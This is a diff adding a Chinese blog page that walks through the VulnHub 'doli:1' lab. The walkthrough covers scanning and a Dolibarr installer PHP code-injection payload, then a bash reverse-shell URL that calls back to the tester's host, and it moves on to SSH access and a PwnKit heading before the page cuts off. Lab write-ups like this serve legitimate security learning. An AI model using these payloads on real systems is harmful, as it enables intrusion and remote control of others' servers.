@@ -1,0 +1,600 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://suc2es2.github.io';</script>
+  <title>
+    VulnHub doli：1 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="doli：1博客原地址：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hirak0&#x2F;articles&#x2F;18116116 项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;doli&#x2F;doli-vulnhub-fixed.ova（环境有问题） 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本 123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub doli：1">
+<meta property="og:url" content="https://suc2es2.github.io/2026/06/19/doli%201/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="doli：1博客原地址：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hirak0&#x2F;articles&#x2F;18116116 项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;doli&#x2F;doli-vulnhub-fixed.ova（环境有问题） 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本 123456789">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xDyEAhSxMzW33CpDC8E.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xH1AQETsDooumdGetNR.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIKdL88zeRsSMUBrcpA.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIc9qMn40KwjDHMwRMw.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIjPGTN4a7ooKEvu9jJ.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIkHJpnqwoZnyx5y2QA.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIkw0KWbSJI8yyU0H47.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIuTNcWGm7OEZVfGfqd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xIy0x6YbUpm9xr8aQiz.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xJ6utmvtEqWgLNLT148.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/033xJDKFRx7nIHvT2RQJrB.png">
+<meta property="article:published_time" content="2026-06-18T17:33:00.000Z">
+<meta property="article:modified_time" content="2026-07-28T12:22:15.758Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="PwnKit">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="敏感信息泄露">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/i/033xDyEAhSxMzW33CpDC8E.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub doli：1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub doli：1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#doli%EF%BC%9A1"><span class="toc-number">1.</span> <span class="toc-text">doli：1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dolibarr-ERP-CRM-7-0-3%EF%BC%88CVE-2018-25357%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">Dolibarr ERP&#x2F;CRM 7.0.3（CVE-2018-25357）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PwnKit%EF%BC%88CVE-2021-4034%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">PwnKit（CVE-2021-4034）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">229</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">185</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-doli 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-18T17:33:00.000Z" itemprop="datePublished">2026-06-19</time>
+    <time style="display: none;" id="post-update-time">2026-07-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="doli：1"><a href="#doli：1" class="headerlink" title="doli：1"></a>doli：1</h1><p>博客原地址：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hirak0/articles/18116116">https://www.cnblogs.com/hirak0/articles/18116116</a></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/doli/doli-vulnhub-fixed.ova%EF%BC%88%E7%8E%AF%E5%A2%83%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%89">https://download.vulnhub.com/doli/doli-vulnhub-fixed.ova（环境有问题）</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿MYsec)-[/home/hirak0/Vulhub/105]</span><br><span class="line">└─# nmap -A -sV -T4 -p- 192.168.10.152</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 15:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.10.152 (192.168.10.152)</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 08:01:98:54:d9:60:7a:38:26:85:f2:aa:96:b1:56:c5 (RSA)</span><br><span class="line">|   256 c3:83:<span class="built_in">dd</span>:93:bc:b6:c8:6d:f5:17:00:b3:50:c4:cb:08 (ECDSA)</span><br><span class="line">|_  256 72:ed:e9:d3:03:d6:3d:6a:ea:24:ad:07:07:cc:0f:79 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:A4:DB:F7 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.42 ms 192.168.10.152 (192.168.10.152)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.38 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="Dolibarr-ERP-CRM-7-0-3（CVE-2018-25357）"><a href="#Dolibarr-ERP-CRM-7-0-3（CVE-2018-25357）" class="headerlink" title="Dolibarr ERP&#x2F;CRM 7.0.3（CVE-2018-25357）"></a>Dolibarr ERP&#x2F;CRM 7.0.3（CVE-2018-25357）</h3><p>访问 80 端口啥也没有</p>
+<p><img src="https://pic1.imgdb.cn/i/033xDyEAhSxMzW33CpDC8E.png" alt="pasted_1785228215391_yltp0q.png"></p>
+<p>将 <code>doli.thm</code> 加进 hosts 文件里，使用 BurpSuite 爆破出子域名 <code>erp.doli.thm</code></p>
+<p><img src="https://pic1.imgdb.cn/i/033xH1AQETsDooumdGetNR.png" alt="pasted_1785235666845_vks0q1.png"></p>
+<p>目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿MYsec)-[/home/hirak0/Vulhub/105]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://erp.doli.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt,php,html,conf,md</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://erp.doli.thm</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 64</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              html,conf,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/security.txt         (Status: 200) [Size: 162]</span><br><span class="line">/document.php         (Status: 200) [Size: 6961]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 55]</span><br><span class="line">/Stewie.php           (Status: 200) [Size: 7017]</span><br><span class="line">/notes.md             (Status: 200) [Size: 310]</span><br><span class="line">Progress: 1102800 / 1102805 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>document.php</code> 文件是登录页面</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIKdL88zeRsSMUBrcpA.png" alt="pasted_1785238878128_959aju.png"></p>
+<p>下面是文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /index.php</span><br><span class="line">#Allow: /$</span><br><span class="line">Disallow: /</span><br><span class="line"></span><br><span class="line"># Security policies of Stewie&#x27;s Deadly Project </span><br><span class="line">Contact: mailto:stewie@doli.thm</span><br><span class="line">Preferred-Languages: en</span><br><span class="line">Policy: No Policy </span><br><span class="line">Expires: Sat, 31 Dec 2050 00:00:00 GMT</span><br><span class="line"></span><br><span class="line"># ChangeLog</span><br><span class="line">- Changed The Super-Admin Password To A Super Secure Random 15 Chars Passwd (Done)</span><br><span class="line">- Crypt Saved Passwords Locally</span><br><span class="line">- Add Firewall Rules And Allow Only UDP Incoming-Outcoming At Port 9110</span><br><span class="line">- Add a lockfile (To do)</span><br><span class="line">- Revert The Framework&#x27;s Patch From 7.0.X To Prevent Conflitions With The Mod (To do)</span><br></pre></td></tr></table></figure>
+
+<p>根据靶机提示 <code>ERP/CRM</code> 与靶机名 doli 聚合搜索一下看</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIc9qMn40KwjDHMwRMw.png" alt="pasted_1785239567865_3m8b1o.png"></p>
+<p>Kali 本地搜索 7.0.x 版本的漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dolibarr ERP/CRM 7.0.0 - (Authenticated) SQL Injection                                                                   | php/webapps/44805.txt</span><br><span class="line">Dolibarr ERP/CRM &lt; 7.0.3 - PHP Code Injection                                                                            | php/webapps/44964.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里我们使用第二个直接拿 Shell，其核心原因在于 Dolibarr 在安装过程中对用户输入过滤不严格，导致攻击者可以注入恶意PHP代码</p>
+<p>访问 <a target="_blank" rel="noopener" href="http://erp.doli.thm/install/Seth.php?testget=ok">http://erp.doli.thm/install/Seth.php?testget=ok</a></p>
+<p><img src="https://pic1.imgdb.cn/i/033xIjPGTN4a7ooKEvu9jJ.png" alt="pasted_1785239856419_52rpj7.png"></p>
+<p>这里得先把 Kali 中的 MySQL 启用，在配置一下远程访问</p>
+<p>然后再去配置一下 doli</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIkHJpnqwoZnyx5y2QA.png" alt="pasted_1785239889704_p1cb1u.png"></p>
+<p>点击下一步时开启抓包</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIkw0KWbSJI8yyU0H47.png" alt="pasted_1785239917891_r3dgo7.png"></p>
+<p>修改 <code>db_name</code> 参数里面的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_name=x%5C%27%3Bsystem(%24_GET%5Bcmd%5D)%3B%2F%2F</span><br></pre></td></tr></table></figure>
+
+<p>Payload 解码就是 <code>x\&#39;;system($_GET[cmd]);//</code></p>
+<p>Send 后响应内容如图所示则说明注入成功了</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIuTNcWGm7OEZVfGfqd.png" alt="pasted_1785240293371_vy6yv6.png"></p>
+<p>现在我们再访问一下 <a target="_blank" rel="noopener" href="http://erp.doli.thm/install/Brian.php">http://erp.doli.thm/install/Brian.php</a> 会发现自动跳转到 <a target="_blank" rel="noopener" href="http://erp.doli.thm/install/Seth.php?testget=ok">http://erp.doli.thm/install/Seth.php?testget=ok</a></p>
+<p>做一下命令执行看看</p>
+<p><img src="https://pic1.imgdb.cn/i/033xIy0x6YbUpm9xr8aQiz.png" alt="pasted_1785240433905_zyj4cy.png"></p>
+<p>直接反弹 Shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://erp.doli.thm/install/Seth.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.10.148/6666+0%3E%261%27</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Python-升级为交互式-Shell"><a href="#Python-升级为交互式-Shell" class="headerlink" title="Python 升级为交互式 Shell"></a>Python 升级为交互式 Shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>OPT 目录中有一个图片</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@Doli:/opt$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">ViewMe.png  playbooks  secrets  stewie.el</span><br></pre></td></tr></table></figure>
+
+<p>下载下来提示是 Cirix 编码</p>
+<p><img src="https://pic1.imgdb.cn/i/033xJ6utmvtEqWgLNLT148.png" alt="pasted_1785240783978_31qngw.png"></p>
+<p>在 Nginx 的日志文件中发现一个特殊请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@Doli:/var/log/nginx/.bk$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 180</span><br><span class="line">drwxr-xr-x 2 www-data www-data   4096 Mar 22  2021 .</span><br><span class="line">drwxr-xr-x 3 root     adm        4096 Mar 22  2021 ..</span><br><span class="line">-rw-r----- 1 www-data www-data 175190 Mar 21  2021 access.log.bk</span><br><span class="line"></span><br><span class="line">172.16.1.1 - - [20/Mar/2021:13:03:38 +0000] <span class="string">&quot;GET /5455644852464247526b464a526b4e4254455a435155314752304651516b5a4653554e4453464243526b564a52304e45544564435245314652304a4c5155464754304646526b74425155593d HTTP/1.1&quot;</span> 403 152 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解密成功拿到密码</p>
+<p><img src="https://pic1.imgdb.cn/i/033xJDKFRx7nIHvT2RQJrB.png" alt="pasted_1785241034792_0xv1ax.png"></p>
+<p>提权成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿MYsec)-[/home/hirak0/Vulhub/105]</span><br><span class="line">└─# ssh c3p0@192.168.10.152</span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.10.152 (192.168.10.152)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:tExKwJAuI2dx2w3YX6+RTB2QHCBdzfKrVfkvY8Es2Ok.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.10.152<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">c3p0@192.168.10.152&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">34 packages can be updated.</span><br><span class="line">2 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;18.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*** System restart required ***</span><br><span class="line">Welcome To Doli (Stewie<span class="string">&#x27;s Deadly Project)</span></span><br><span class="line"><span class="string">Last login: Thu Jul 29 13:03:51 2021 from 172.16.118.2</span></span><br><span class="line"><span class="string">c3p0@Doli:~$ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PwnKit（CVE-2021-4034）"><a href="#PwnKit（CVE-2021-4034）" class="headerlink" title="PwnKit（CVE-2021-4034）"></a>PwnKit（CVE-2021-4034）</h3><p>将脚本上传至靶机即可</p>
+<p>漏洞根源是 <code>pkexec</code> 在处理命令行参数时的一个逻辑缺陷</p>
+<ul>
